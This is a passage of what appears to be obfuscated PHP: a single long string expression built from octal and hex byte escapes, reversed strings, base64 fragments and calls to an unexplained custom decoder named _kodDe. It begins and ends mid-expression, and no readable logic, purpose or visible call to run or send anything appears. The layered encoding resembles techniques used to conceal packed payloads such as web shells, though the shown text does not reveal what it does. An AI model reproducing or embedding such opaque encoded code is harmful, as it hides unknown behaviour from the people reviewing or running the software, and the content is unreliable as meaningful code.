\56\65\327\142\235\341\267\372\215\274\37\101\150\64\34\125\63\232\225\351\110\315\125\111\56\250\162\76\245\217\372"."\xa\x99\x2\x8d\x8a\xd9\xde\xeb\xa0\x79\xdc\x75\x9d\xa6\x1d\x92\x58\x76\xd6\x4c\x6a\x59\xb9\x89\x34\x9c\xb1\xed\x42\x5c\xcf\xa7\x70\x4f\x40\x53\xcc\x91\x3c\xe9\xa9\x82\xae\x3\x52\x8b\x47\x49\x29\x1d\xca\x4a"."\xa5\xbd\xd1\x68\xb4\x58\xc6\x5c\x96\x87\x58\xeb\x38\xcc\xe2\x40\x7b\x94\xd\x67\x2a\xd\xd4\xca\x56\x8c\x2a\xf8\xa0\x61\x11\xe6\x27\x66\xae\x56\x28\x64\x8d\xa4\x66\x1b\x66\xde\x6f\x26\x6d\xdd\xf6\x5a\x76\x51"."\327\240\304\100\62\251\133\226\67\150\346\355\242\231\365\6\262\131\163\304\33\55\32\3\106\276\121\231\111\161\160\42\232\357\136\314\33\33\141\22\127\55\124\60\341\340\317\314\154\52\331\151"."\357\174\66\71\71\166\121\313\133\151\275\350\15\301\314\150\124\120\145\71\203\144\150\55\206\125\60\55\3\127\257\121\321\154\133\113\146\60\163\21\305\67\175\1\276\221\317\32\171\275\34\27"."\25\242\173\273\212\332\100\116\153\124\12\245\176\324\1\60\41\1\226\304\30\62\62\164\100\243\222\323\106\275\332\0\53\51\64\132\60\212\272\305\132\255\264\165\44\200\242\322\336\16\74\221"."\14\75\345\215\43\356\15\205\315\256\233\243\40\132\121\130\32\205\266\47\22\135\152\270\25\55\317\235\41\265\43\220\10\266\103\351\266\66\300\212\216\40\236\314\213\144\300\25\136\64\241\60"."\65\165\242\306\11\140\227\71\242\27\321\207\233\307\32\225\101\63\325\157\216\372\130\22\106\216\43\316\302\220\361\370\26\154\157\114\313\17\340\146\364\217\331\72\320\234\340\115\315\150\61\367".strrev('ÄêôÆõ¿ƒjÊ3”GŸÚÁˆXšÚ<jb…–Å•†vóÑœ†±­³iëõõìé¥')."\xa4\xcd\xf2\x69\x5\xd1\xfb\x2b\xbc\x78\xc2\xe0\x8f\xb3\x54\x3c\x89\x58\x5a\x24\xdc\x86\xfb\xae\xc5\x6b\x21\x24\xaf\x8c\xc5\xca\x8e\x18\x39\x3\x37\xcf\xe6\x29\xa4\xb3\x91\x60\xd0\x6\x15\xf2\x93\x36\x37\xf5"."\132\63\153\172\123\263\152\275\350\337\231\265\75\275\55\276\231\175\113\374\206\310\343\257\367\325\53\15\165\363\224\56\44\251\30\132\126\201\106\227\141\324\51\321\245\316\156\21\24\156\244\120"."\334\260\307\52\116\56\104\114\246\245\173\333\165\15\61\152\64\30\216\261\361\260\357\321\370\27\364\60\136\57\45\176\342\32\33\12\214\205\116\350\16\305\23\152\107\50\321\36\155\201\46\204"."\x2\x10\xca\xa3\xcc\xa4\xce\x6c\x9c\xb1\x70\x46\x83\xa8\x9f\x21\x30\x2a\xad\x23\x62\x3d\x48\xca\x9d\x42\xf2\x75\x9a\x23\xeb\x61\x5\x70\x11\x51\x30\xa3\x27\x7\x27\x49\x43\x21\x68\x8d\x49\x79\x13\x1b\xbe\x1e".strrev('h¢¾)–m4v ‡VkW5<Ğç'."\n".'_BÙĞêê ×û5V<åNÖ•jÃTGİÓú')."\273\156\14\144\240\242\6\56\56\151\146\315\242\226\305\374\237\11\257\3\6\260\342\102\266\204\150\337\217\13\116\144\112\271\176\130\255\120\37\15\350\266\220\53\255\61\44\174\1\367\105\142".base64_decode('OOrMMAwLrL0Q86uYXnt9hfxA7XQoS22YW4cBMIzQMiRgl/TypvuSJprcHdqg3ojbAhxtIQ==')."\x81\xb2\x88\xc4\x34\x17\xe2\x75\xae\xc9\xcd\x1b\xf0\xf0\x64\x7d\x39\x54\x8\x29\x33\x68\xf2\x95\x99\x6e\x61\x40\x10\x62\xeb\x9c\xa2\x17\x8b\x66\x71\x1a\x60\x90\xb0\x42\x16\x4b\x3c\x5c\x50\xb8\xcd\x45\xf\xb"."\261\1\26\316\230\134\124\61\31\61\66\372\241\335\63\32\132\201\165\244\220\310\346\263\154\64\10\250\201\132\52\125\11\214\330\15\24\260\236\321\51\111\130\17\262\200\77\76\33\375\57\26".base64_decode('/pSZ09gyShZAPUVXQAeITlsKmsnKLdomTiw6MBElZkyoGRp6aFWJN481NKVndUZFGZ0JEQ==')."\165\200\206\272\237\323\130\232\23\73\332\46\40\250\220\336\14\53\206\162\342\45\237\305\227\343\175\225\0\140\271\7\210\107\4\263\150\350\242\144\326\210\170\127\121\117\33\300\271\363\150\366"."\167\150\305\101\326\60\224\123\314\67\34\221\346\142\153\167\44\242\6\243\235\11\264\55\243\220\345\261\160\2\170\125\14\361\34\65\20\354\202\230\340\154\134\64\223\205\13\12\31\156\0\72".base64_decode('QZXwCykILcMFM4/4J7Agr9i0lSWlhJAABCIEC5esgFb73FpvDjEPL6+TU0RTYMmnkl4Yhg==')."\51\305\7\7\167\36\232\310\114\66\354\212\306\41\303\22\14\105\362\171\77\237\157\135\335\220\224\223\110\244\55\4\300\375\201\252\62\132\75\320\323\362\70\133\306\113\10\277\150\254\325\104"."\x93\x96\xb0\xfa\xb0\x86\xe4\xb2\x42\xdc\x77\xb6\xca\x2b\x46\xbe\x64\x79\x75\x2c\x69\x88\x2f\xcc\xf1\xb6\x77\x4\x82\xde\x78\x7b\xa0\x61\xee\x3c\xa\x5d\x99\x4b\xf5\x26\xda\xd\xab\x77\x15\x8f\x43\x37\x8e\x58".strrev('’Ñ„Ù%*÷¶%“VÏ[Ÿd§šÍec«««è=ÁK‹ÎoJŞªIIc¤”CPû¢Ôs')."\114\374\305\253\214\345\35\61\30\147\236\316\167\12\323\313\251\147\272\163\75\204\42\112\144\45\126\265\44\376\230\212\112\264\113\226\334\123\150\132\221\225\233\111\365\24\252\145\7\120\247\333"."\x99\x9c\xc\x14\x3\x4f\xe3\x3a\x15\x11\xf9\xd8\xf1\x5e\xc4\x7d\xeb\xa4\x71\xb9\x4a\x5\x13\x9\xa5\xd0\x8c\x15\x15\xeb\xb0\xa2\x52\x1d\x56\xb8\xea\xb0\xa2\xbc\xe\x14\x64\x19\x3\x79\xd4\x4a\xb6\xb8\xc1\x70"."\264\341\341\220\206\325\61\314\243\52\312\250\302\34\122\345\246\100\47\101\63\344\224\166\316\315\130\43\73\132\346\262\172\4\72\126\171\133\2\214\27\54\132\202\110\124\31\306\332\46\63\337"."\x54\x5d\xef\xab\xab\x56\xd8\xae\xb9\xa9\xba\x3b\xd1\x8a\xf6\x10\x4b\x16\xef\xbf\x28\x68\xe6\xa\x98\x31\x76\xe0\x8d\x22\x9e\x42\x74\xb3\xb8\x18\xa6\xc7\x22\x2c\x9f\xb1\x48\x17\x9f\x61\x34\x1e\x4a\x68\xb0\x38"._kodDe('KecjbcDxgIqIuf/Ii4/LOW5d08HGh+64NQlNYNqDBTFNXYtsBEojlzCWIg99OeNPZxGX0tM=')."\x25\x1a\x2f\xc3\x9b\xa3\x89\x76\x7\xb4\x1b\x49\x6a\xcb\x2\x91\xb0\x1b\x3d\xb4\x22\x1c\x4f\xc4\x2b\x26\x21\x58\x77\xc8\x95\xd2\xd2\xac\x76\xc5\x42\xad\xe1\x15\x3c\xda\x1a\xe\x45\x5a\xe2\x6a\x30\x10\x6c\x17"."\x38\x9d\x81\xe\x88\x20\x91\x48\xcf\xa6\x2c\xbf\x13\x5f\x45\x22\x67\x9c\xab\xd4\x54\x18\x30\x88\x39\xb4\x58\x2a\xd3\xcf\xa8\x82\x17\xa3\x2d\x8c\xe\x4\xc\xcd\xc5\x4a\x49\xd2\x12\x95\x4d\xfa\x12\x17\x20\xd9"."\176\75\307\26\133\264\375\202\21\141\173\217\32\372\123\253\4\342\212\135\200\62\320\262\332\77\306\203\244\31\54\216\204\15\370\276\2\342\157\131\15\124\214\323\54\155\164\52\3\2\151\233".base64_decode('C5yuOFpERBoagQDRfiJKICMCnzHQklS0A6w6aaF5VKNdoVgA6y3V5bFoZxtkGMnorAJh6A==')."\376\32\266\363\4\365\245\55\126\166\55\153\150\114\217\45\72\175\215\311\272\362\30\372\203\66\335\114\244\317\263\356\356\307\322\15\223\153\131\40\215\346\3\223\114\314\22\377\114\277\151\102".base64_decode('0Vm811rPVlyu91xjMeoYZWv1rPVsTQCajS4NdaqMpGhMIkMKCMVi0Rj0hG0OMp0XTYyF4g==')."\154\231\304\353\217\301\372\311\357\233\5\344\253\43\41\16\76\357\77\261\167\144\126\115\217\167\226\257\17\5\152\147\36\107\243\20\353\365\71\242\114\266\56\25\171\156\74\325\153\254\45\265"."\x8d\xbd\xfe\x5e\x7f\xcd\x92\xc6\x9e\x80\x77\xad\xe6\x5d\x5b\xe7\x5d\xe0\xed\x43\x12\x79\xed\x2c\x0\xf4\xad\x6b\xf0\xcc\xd9\x80\x11\x10\xe2\x92\xa3\xfb\xd0\x4f\x53\xef\x92\x19\xbd\xde\x63\x7e\xb0\xfa\xb8\x9e"."\336\276\352\306\131\323\172\175\107\367\216\364\315\254\135\302\276\223\54\25\221\320\317\130\77\252\152\152\126\15\252\22\332\232\162\224\274\304\321\10\2\113\130\153\24\4\164\335\274\15\14\216"."\xc6\x50\x1f\x10\x39\x7a\xbc\xbd\xb3\xfa\x96\x48\xf9\x24\x90\xfb\x5b\x68\x49\x42\x2\x4c\x86\xe3\x5\xbc\xab\x70\xcb\x78\x56\x3c\xe1\x81\x3e\x4a\xf9\xa4\x58\xdf\xf1\x84\xe8\xd7\xf8\xfe\x6e\x20\x2f\xf6\x51\x76".base64_decode('ketBhxGRisVq3Qz6u4EN5IAOs52cgRSBOkt5Y4htaPL6EARMmxF2v26P6Iw8ENwRR8TBFg==')."\120\224\44\305\262\322\342\113\24\126\234\106\71\61\31\5\25\357\355\106\170\14\255\307\60\116\123\1\333\112\152\5\75\56\265\120\125\23\201\346\110\110\145\254\5\130\60\213\23\166\330\314"."\x4f\x4b\x50\xd3\x4\x2b\x65\x8c\x41\x52\x46\x11\xe5\x10\x4c\x79\x6b\x28\xab\x10\x8e\x40\x37\x55\x8d\xe4\xe0\xc8\x2a\x15\xf0\xfe\x48\x41\x23\x8e\xfa\x56\x41\x92\x90\xd2\xb4\x58\xa1\x5d\xe\xf9\x54\x79\x0\xa"."\x7c\xdf\x83\xb5\x99\xba\x98\xf4\x98\x35\x41\x9d\xa\x62\x84\x2c\xb4\x25\x61\x9b\x2\x7f\x4d\x6f\x6f\xa9\x47\x4f\xf5\xf5\x20\xc2\xd7\xbc\xe9\xbe\x75\xb3\x37\xd4\x32\x8d\x89\xbf\x17\xfd\x61\x91\x40\x85\x23\xc"."\225\263\101\25\11\270\76\134\17\256\252\166\104\170\62\215\232\105\276\263\50\70\366\357\266\151\153\131\107\21\11\14\201\301\345\222\57\50\155\351\150\107\4\307\302\262\260\164\366\103\370\150"."\47\127\222\162\211\122\72\174\300\71\342\272\355\343\30\36\51\121\105\161\307\71\134\23\50\140\323\106\36\115\247\240\264\306\121\325\171\234\154\373\35\7\106\226\256\25\223\231\326\122\66\153"."\163\155\113\326\30\204\57\300\134\201\363\53\57\375\121\146\125\312\332\152\26\231\2\162\46\124\243\152\146\45\304\160\76\157\246\372\145\122\23\253\153\133\0\311\61\11\245\206\235\265\50\341"."\116\245\71\32\215\204\2\235\12\136\310\141\1\102\122\102\74\324\25\100\253\27\126\145\306\23\41\70\376\11\267\170\131\271\53\274\114\207\301\3\6\164\273\131\240\2\270\156\253\131\223\61"."\xf\xa7\x16\x4\xef\xcd\x3c\x58\x17\xe1\xc1\x42\x85\x7\xd5\xda\x83\xd5\x17\x1e\xb1\xf3\xf5\x88\x23\xc\xcf\xb0\xa1\x8f\x90\x0\xdf\x95\x7a\x60\xb3\xea\x11\x8a\x17\x8\x86\x5b\x3c\x86\xd5\x42\x36\xdd\xe4\x3"."\44\211\125\301\316\140\315\162\126\33\363\320\352\104\364\141\75\353\141\52\31\17\253\243\207\51\242\74\104\201\324\2\325\352\106\323\11\252\105\202\210\153\146\74\230\200\60\375\172\304\241\212"."\307\34\311\353\105\202\2\35\43\366\353\36\261\227\367\14\24\315\122\241\213\175\123\212\321\152\1\100\324\231\3\142\246\151\173\230\156\313\43\53\271\240\26\1\66\117\52\166\147\345\326\220"."\376\167\127\2\350\13\47\225\367\322\227\14\126\371\170\70\365\173\353\150\211\240\314\334\300\126\71\7\16\321\263\161\261\23\167\270\10\55\23\23\25\67\240\125\203\343\73\132\254\34\346\4"."\232\167\22\252\70\77\21\47\147\102\310\165\153\141\334\147\152\370\243\150\47\22\227\76\147\153\3\354\133\230\131\361\175\112\5\124\32\216\351\311\261\244\120\353\264\110\312\42\147\254\204\112"."\x88\x6b\x69\x57\xb3\x3c\x64\x1e\x55\x9a\x3\x95\xc7\x98\xd3\x35\x1f\x92\xfd\xa7\x4e\x65\x7d\xcc\x88\x9d\x8f\xaf\x63\x8e\x7c\xf9\xec\x84\x76\x11\x16\x18\x2d\x8\x21\x82\x56\x16\xb3\xe1\x38\x5a\xd4\x5a\xb3\xac"."\123\32\344\144\140\300\36\147\14\117\56\37\141\310\344\224\72\316\225\206\221\120\153\102\71\76\212\270\227\141\252\64\217\212\221\25\362\217\231\127\34\145\263\356\122\232\110\272\210\153\371\24"."\205\254\106\234\176\165\123\25\373\110\225\43\273\40\23\147\45\74\54\352\370\232\30\161\271\23\60\71\220\346\213\325\211\201\242\142\61\54\201\344\247\131\260\371\302\52\127\10\351\14\46\206"."\126\246\113\211\335\10\0\253\227\343\273\70\52\346\24\43\11\5\177\0\12\40\262\12\146\51\136\61\73\244\250\263\313\135\24\351\132\102\161\27\165\31\371\61\43\37\67\360\336\334\15\135"."\317\127\141\41\4\340\311\55\142\224\52\47\13\323\105\4\253\276\150\371\36\70\2\366\144\215\374\240\264\100\13\315\46\252\75\316\52\325\35\112\162\325\34\12\222\120\104\17\300\174\6\212"."\xcf\x68\x45\xd1\x99\x8c\xb\x61\x56\xc0\xdb\x60\x61\x14\x11\x95\xd0\xd2\xda\xb0\x10\x50\x1c\x79\x24\x5e\x62\xd9\x63\xac\xf6\x72\xd0\x59\x28\x8d\xb6\x78\xc8\x6f\x3b\xaa\xbc\x3c\x5d\xf9\xf0\x60\x3e\xc2\x90\x28"."\xb\x42\xbc\x20\x82\xfa\xa\xfd\x90\x86\x24\x4c\xf\xd6\xdd\xa3\x1f\xba\x8c\x33\x6b\x0\x82\xc4\xe8\xbe\x94\x6b\x81\xb3\x0\x1c\x5e\x86\x18\x0\x10\xe\xee\xf0\x1a\xc6\x40\x40\x98\x50\x25\x5d\x0\x67\x40\x4e"."\x71\x80\xd6\x24\xc0\xd9\x3b\x92\xd7\xb3\x68\x35\x2b\xfa\xf0\x1c\x69\xc3\x6b\x12\xeb\x13\xca\xde\x64\x9a\x8b\xeb\xa8\x9d\x50\xbc\x28\x21\x5e\x96\x26\x63\xb\x1d\x2a\x66\xf7\x62\x79\xe0\x7\x60\x7c\x8a\x89\xfe".base64_decode('FfNpQFQId6daXg9MwZXjrUWTC7d8ZXcjBcnukRt1uFZjqT8cEkQZSMrjliVcUFcUyxeuaQ==')."\x2d\x78\x20\x53\x8e\xd1\xe3\x98\x22\x5d\xc0\x7c\x68\x4f\x0\x36\x3a\x9e\x3a\x49\xdc\x12\x7c\x66\x1d\x3d\x12\x83\x5\x6f\x83\x6b\x9c\x6d\xd3\x44\x1b\xcd\xa2\xaf\x88\xbe\x2c\x2a\x24\xf1\x38\x60\x10\xc4\x4e\x3"."\xaf\x83\xb2\x90\xc0\x4b\xb1\x50\x82\xc4\xad\x9d\xb2\x10\xcb\x19\x2f\x68\x8c\x49\x73\x39\x8d\x51\x2f\xd9\x55\x94\x4\xe3\x24\x55\x16\xf5\xe1\xb5\xa0\x9\x11\x2e\xdc\x62\xf6\x10\x4a\x19\x36\x86\xe0\xf9\x66\xb2"."\x73\x20\x81\x28\x56\x48\x77\x66\x11\x97\x59\x36\x59\x79\xca\xc6\x5e\xec\x1c\x3c\x33\x1c\x98\x4e\x69\x1\x80\x33\xc9\x92\xee\x13\xc2\x4d\x65\xd3\xa4\xa4\x59\x0\x82\x90\xcc\xf5\x72\xe6\xb0\x2e\x1\xf1\xb9\x5b"."\101\244\110\121\232\54\45\211\102\45\54\76\106\244\106\150\172\245\210\110\54\172\201\340\102\136\262\237\246\63\330\207\167\20\76\321\313\341\226\100\261\310\350\227\66\23\237\11\43\240\14\302"."\354\57\316\46\137\245\345\212\26\36\32\26\306\170\264\50\374\141\37\235\375\370\340\61\232\147\222\247\24\56\107\225\225\212\225\13\212\213\303\167\147\254\62\172\40\233\25\46\123\356\370\244"._kodDe('LthJh5y5IzmApaO9gqMcmCTT9IjLNbnnY6jxQ4MeP6Ci2alhzlHgDJx7NyBj1FOWZTliNQs=')."\253\22\313\372\377\54\33\227\367\74\236\41\223\221\13\116\223\324\317\330\50\170\130\227\367\14\134\325\52\130\24\137\265\327\273\145\21\220\7\244\210\152\73\104\252\30\51\137\232\116\16\12"."\101\323\227\366\7\136\261\302\121\237\65\11\315\272\361\270\155\11\341\211\243\174\241\225\63\341\44\74\226\162\241\102\204\373\2\174\136\270\20\347\144\74\104\273\70\141\262\272\262\144\136\312"."\317\76\330\163\301\375\227\320\360\337\317\372\363\216\307\376\100\303\15\363\301\316\24\244\77\364\167\137\22\332\113\266\14\337\274\242\307\74\374\267\337\156\75\362\337\113\266\75\177\350\41\163"."\257\255\75\367\274\337\375\324\27\371\107\325\11\77\31\275\170\327\322\277\376\346\255\267\75\167\275\376\326\223\305\341\145\323\277\175\377\141\271\157\355\236\26\332\162\367\161\175\267\147\266\36"."\232\331\70\157\370\244\103\247\236\167\325\347\77\275\173\227\152\17\357\376\345\75\27\134\170\330\246\201\211\307\57\275\324\372\370\111\375\322\15\357\75\173\376\121\115\143\203\77\272\365\300\256"."\x6f\x74\xee\xbd\xe7\xe9\x9f\x1f\xe8\x8d\x28\xaf\x2e\xb8\xe2\x2b\x4b\xb6\xff\xf8\xe3\x5f\xbf\xf8\xc8\xf7\xae\xff\xca\x53\x6f\xee\xeb\xbb\x72\x5d\xcd\x61\x2f\xde\x78\xd7\x8b\xaf\x7f\x3e\x72\xf0\xd7\x17\x1e\x76"."\xf6\xc7\x67\x1e\xbc\x6e\xfe\x29\xa7\xf8\x63\x4f\xe9\x1b\x43\xe3\x5f\xdd\xaf\xe6\x98\xf7\x1a\xc7\x1e\xd\x6c\xf\x5f\x75\x72\xed\x99\x17\xcf\xef\x6a\x5b\x7b\xc7\xdb\x81\x9b\x97\xfc\xe1\xc0\xb5\x7\x74\xee\x48"."\336\163\314\66\175\347\271\43\155\7\35\71\336\60\343\234\5\336\201\43\77\373\364\254\17\37\334\62\375\175\355\376\276\361\363\77\73\351\354\361\343\27\31\267\367\254\277\357\345\254\171\341"."\x8f\x57\x9d\x77\xc8\x47\xe7\xa4\xa2\xd9\xf9\x4f\xf4\x9f\xfd\xe2\xf3\x1f\xc4\x57\x75\xa4\x77\x3d\xff\x87\xa5\xad\x57\x5f\x70\xdb\xc1\x9f\xee\x37\xfb\xa5\x7f\x4e\x79\xe8\xa4\xfb\xfc\x9f\xae\x3e\x79\xe5\x50\xce"."\332\260\163\205\147\372\315\227\215\7\237\376\320\170\271\365\370\276\203\77\372\351\201\201\7\157\137\326\321\171\343\360\101\227\4\177\375\304\25\233\37\331\357\235\55\67\135\176\365\153\27\105".base64_decode('Vng29nfumf+vWvvFc+/d9nrbBYcWVhf7Nt/34HO+U9L6PluH9v3xpt+8e/oz0x4/6qvf3g==').base64_decode('e8qrV/b3f7j39BVH7Pnq+vQLD19/wD+eP0TZtXFatn/zQeF+/1m1H573fPawG/XQSs+qtw==').base64_decode('u7429fwHps0++Mrg157P1P3rlCMesLMjdZti90wLnvXcQ5c8sn98b+2lk/90xNHH/eUr7w==')."\74\324\320\74\332\270\172\335\351\47\117\251\73\363\167\261\301\306\27\177\321\21\77\262\364\332\77\117\272\153\307\131\347\326\136\76\243\135\177\352\214\327\56\377\303\313\373\34\362\154\375\320"."\111\7\275\362\160\374\73\332\352\305\267\357\334\377\227\127\257\273\360\317\267\177\277\47\66\365\260\145\277\171\262\173\377\277\356\74\76\262\155\42\377\166\40\231\277\352\332\177\207\213\373\6"."\216\273\166\345\273\27\134\175\320\274\334\310\266\237\276\365\343\67\247\376\176\363\47\123\277\125\173\331\301\155\47\64\356\75\373\233\43\117\374\143\317\247\35\317\145\117\173\364\215\216\303\347"."\xc6\x5f\xd8\x38\xe5\xb4\x17\x76\xac\xf9\xe4\xb8\x8b\xf7\x3b\x73\xe8\xfb\xd7\x6c\x7c\xfa\x92\x29\xef\xbe\xbe\x56\x7d\xed\x99\xdf\xee\x55\xbf\xfa\xa8\xef\xed\xf3\xa7\x9b\x2e\x58\x7c\xed\xd5\xc1\xed\xf9\x39\xdf".base64_decode('3vvj68annXzWNb07jjvzrqN7N//+sd+1Tuzd/mrLO+seOGlqm++gH7+7z08Ou3LD6gcztw==')."\115\74\362\323\372\133\7\137\10\116\73\354\332\377\36\76\155\303\67\77\70\164\277\256\343\123\213\277\63\325\127\172\370\342\353\36\74\353\240\246\7\222\123\177\162\311\256\231\253\16\271\170"."\375\367\256\173\340\370\346\257\76\376\227\347\226\76\374\356\353\337\73\345\300\167\316\274\365\277\136\275\367\303\113\317\133\25\313\234\356\355\74\74\131\77\325\52\305\36\257\231\132\275\337\11"."\233\316\332\162\132\343\363\7\335\241\335\364\147\63\161\173\347\330\255\107\337\262\351\341\201\103\157\274\253\372\306\322\327\357\50\156\271\157\312\247\177\374\166\363\327\247\377\364\240\53\317\74"."\344\250\272\216\13\347\36\366\352\351\271\7\66\336\134\234\123\235\271\340\204\71\63\37\350\275\345\355\143\127\255\272\353\205\354\121\306\326\171\327\177\377\231\137\335\176\342\75\115\53\74\53"."\366\333\361\320\340\226\113\176\367\342\306\103\214\271\23\113\257\362\365\66\174\34\12\54\333\162\112\352\211\356\33\347\166\35\176\365\265\123\266\65\4\126\255\175\362\17\273\267\74\372\300\201"."\273\17\170\356\140\317\121\373\217\157\276\263\41\174\313\17\226\336\25\371\355\354\251\326\157\37\314\77\373\300\53\333\76\70\362\350\313\102\147\376\361\203\153\16\377\353\277\237\135\341\175\354".base64_decode('z9VTPnssEB9SX+j/RcvGoZcD34hOe+Ey9baFvz7w60tfnfvSgdeu/saTQeWTVx86ePkvZw==')."\275\364\366\277\314\356\355\313\147\375\363\210\207\62\277\34\172\355\221\245\217\174\155\343\143\251\77\336\76\343\351\373\256\136\265\357\153\157\36\66\355\265\147\17\150\337\357\30\363\214\337\117".strrev('j°|Öšê¼ËÎŞş»á¾[Ÿ›µ¦ã¹ßRÌÁîºÛ/ÛŞ„ğüÇÚJ3¡ãéy').base64_decode('+7PfOvjMk9587IgXMh98zZO6/bHOu5752dzzz3nd6ph+6M+qDtemXLWh7tT9h8wpb77yxA==')."\xa7\x97\x6d\x2c\x28\x89\x95\x63\xeb\xd7\x3d\xb5\x4f\xf7\xfb\xa3\x73\xce\x9a\xf7\x5f\xfb\x4e\x7f\x6c\x22\xe6\xf9\xac\x6f\xe8\xa8\xe5\xe7\x8f\xdc\xbc\xf4\xb5\x85\x23\x63\xc1\xa7\xbf\x7e\xd4\xaa\xf7\x7e\xbb\xc9"."\74\275\364\137\177\311\67\237\172\340\105\123\377\364\370\155\247\275\267\357\233\317\346\356\273\157\344\351\272\367\7\67\177\60\176\335\205\75\113\357\174\175\333\136\341\13\137\276\172\355\67\352"."\27\176\376\301\155\357\57\371\317\353\357\75\363\252\117\135\262\363\243\337\77\375\316\25\367\357\130\377\237\177\357\374\375\163\352\345\73\77\335\375\102\233\377\311\45\237\277\371\233\337\57\377"."\316\17\77\32\337\373\312\167\137\75\372\7\377\370\332\222\147\36\275\374\312\31\177\277\376\67\127\164\334\170\111\363\266\7\332\236\335\174\301\153\353\173\377\153\343\271\117\36\334\372\374\272".base64_decode('xzYds/CBW2+f+tFB9s3fLe1z5tB+O6/bc96a7P2bn1vZM+/XDy/efOMjveFbfzQxp27f7w==').base64_decode('HH/wXfseeGDq467a6NV7rjA6jtRf6Vs1dm9x3cpZp3/45/5Xe8++eNlF/xp+8z9rHm04+w==')."\351\361\320\373\337\127\17\177\364\326\135\65\217\372\226\75\64\177\117\355\43\277\333\336\362\263\342\246\177\266\375\162\257\37\105\216\76\356\212\107\367\363\66\174\167\345\346\25\237\154\173\346"."\xd2\xef\x4e\x39\xe1\x8c\x53\xae\xda\xef\x94\xcb\xa7\x2e\xfc\xee\x77\x66\x3c\x79\xf8\x1d\x47\xaf\x5c\xb6\xf3\x95\xb7\xd2\x91\x4f\x36\xee\xd6\x9a\x9f\x5e\xfb\xe0\xf3\xef\x7c\xfa\xbd\xaf\x35\x36\x2e\x6d\xfc\xdb".base64_decode('FTX7Tt18/t/v+/ux2z66+5kjPvnXlG/cuend9Df//HqvNnvg8Zue3PXuJY8vs/6Tvip6QA==')."\361\376\336\165\53\236\33\131\372\335\371\13\233\376\366\265\227\217\37\271\350\325\65\357\134\221\77\364\210\15\261\43\346\274\164\141\276\251\355\157\173\224\266\263\337\336\236\336\366\250\75\357"."\215\334\163\137\275\154\371\115\313\277\371\170\144\136\361\355\267\237\374\367\360\123\77\331\351\373\341\365\243\226\76\166\143\342\346\63\372\243\67\326\315\134\372\327\243\137\270\366\326\303\137\337".strrev('Û®ßÖ¹ï3|·Ïüü7‡ğş¿­üœG;ûb·×%à¢à=Áõ½/[ÁzXî›ÇÖÅ»ò').base64_decode('8XbT4v3Cv/7Gue+e8eY53T8wtl4d3evGC/ZNXf/WS6e8NaWq/6n+mxcPtu+3eK+qv/xTeQ==')."\xe1\x17\x77\xd6\x75\x2f\x78\xfa\x1f\xa7\xbd\xf4\xd6\x3f\xf\x69\xff\xea\x6f\xa3\x37\x5f\xb3\x63\xd1\x96\xdf\x7f\xaf\x61\xe3\xf2\xce\x7d\x5e\x39\xe4\xc5\xd9\x2f\x79\xbf\xd6\xf0\x48\xc7\xb3\xb9\x47\x66\x6d\x79"."\xf9\xea\xa9\x2f\x36\x6c\xd5\xae\x79\xea\xbe\xd8\xd7\x7f\x61\xb4\x5c\xd9\xf1\xda\xbf\xce\xda\xf1\xd8\xfb\x2f\x5d\x74\xdd\xf4\x87\xfe\x78\xef\xdf\xab\x7a\x5a\xcf\x68\x59\xfd\xde\xf2\xad\x73\xbc\x2f\x5f\xdf\xf2"."\307\147\267\337\241\37\231\376\372\1\376\55\247\74\362\207\356\243\76\137\276\344\266\327\42\277\352\54\114\114\173\244\246\361\211\354\45\217\105\176\164\325\247\245\223\377\172\324\216\257\74\261"."\341\245\247\176\271\75\176\54\32\226\233\322\67\234\132\177\336\326\150\364\362\344\15\17\35\20\177\256\164\120\233\276\357\255\137\371\316\147\27\376\246\321\177\162\313\304\343\55\147\335\321\175"."\x8f\x9e\xff\xdb\x9b\xdd\xc9\x87\xae\x4b\xe7\xef\xac\xdf\x70\xeb\xe5\xb\xff\xfe\xa7\x3f\x3d\xa4\xec\xf9\xcb\x43\xf\xdd\xfc\xda\xc9\xdb\xee\x3c\xf0\xbd\xf\x27\x5e\x7b\x3b\x7f\xd7\xec\xc0\xd3\x7\x3f\xbb\xe6".strrev('÷¶£Ú¨á³Ş÷–Ïô_môÎ\'ây?_ãøû÷¯|[sß\'}ï§‘áîŒëVéø~ÿï')."\x7d\x65\xfa\xf2\xfd\x4e\x3f\xf0\x36\xcf\x94\x2b\xcf\xce\xdd\xa8\x1c\xb5\x70\xfd\x8a\xa7\xae\xbb\xf5\xfe\x99\xcf\x35\xdd\xe5\xfd\xe1\x11\xe1\x7d\x23\xcb\xaf\x38\xf8\xfb\x85\xe5\xff\x3c\xea\xe5\x7b\x8f\x9f\xb7"."\111\371\301\257\336\270\345\375\241\216\235\167\116\173\244\243\324\374\112\167\342\47\355\257\234\67\377\347\15\227\264\150\377\35\277\376\340\253\177\76\363\73\117\175\76\364\331\133\67\275\377\352".base64_decode('hqGPx7c/ufizibfuv7/pk11PnxG94vLP/6G+uvOjt9564WLtm/ev//enr7/66qk/fPWzjw==')."\137\177\346\367\147\74\265\270\361\223\47\336\171\152\361\177\76\172\375\307\367\253\237\355\176\377\363\15\377\331\327\377\346\117\56\273\377\251\27\57\75\162\237\211\155\37\254\133\174\300\254\211"."\255\367\34\373\312\153\353\336\271\327\237\275\257\373\306\147\377\366\322\302\255\57\357\234\370\301\115\57\277\361\341\277\117\76\371\241\153\76\371\306\221\173\277\134\167\365\334\43\136\370\155\162"."\327\216\347\177\174\320\225\137\255\176\372\205\117\347\334\171\367\105\376\237\233\331\103\227\136\172\317\222\103\57\333\137\75\375\220\307\117\253\77\345\212\7\156\73\342\240\107\222\117\364\77\370".strrev('c¨'."\0".'Ë c¥+¦zØí¿vïx´¿[å>ï©Öı_«¯tºÅUòdŞİúe;ï3“')."\27\200\334\64\177\366\2\32\130\233\351\327\207\7\100\354\234\63\37\354\211\122\371\244\265\166\30\116\205\41\313\332\364\100\156\44\3\132\261\206\172\310\77\147\16\174\156\36\263\105\232\307"."\x92\xe6\x2f\x80\xc3\xdd\xc2\xa8\x65\xf\x65\xc0\x3e\x77\x36\xe0\xaf\x19\x33\x47\x8b\x25\xd8\x31\xa5\xb\xb9\xd2\xa8\xe\xe7\x98\xa0\x76\x3e\xb6\x1\xa\x5c\xb0\x0\xa\x34\xd7\x68\x56\x9e\x6d\x40\xb4\x6c\x32".strrev('?›€o¯U'."\r".'œŸ_ŸÍ/†åŸ¶V£Ù  ó'."\r".'¡cÄ¤>ÎÇ°ô	fı5¹c(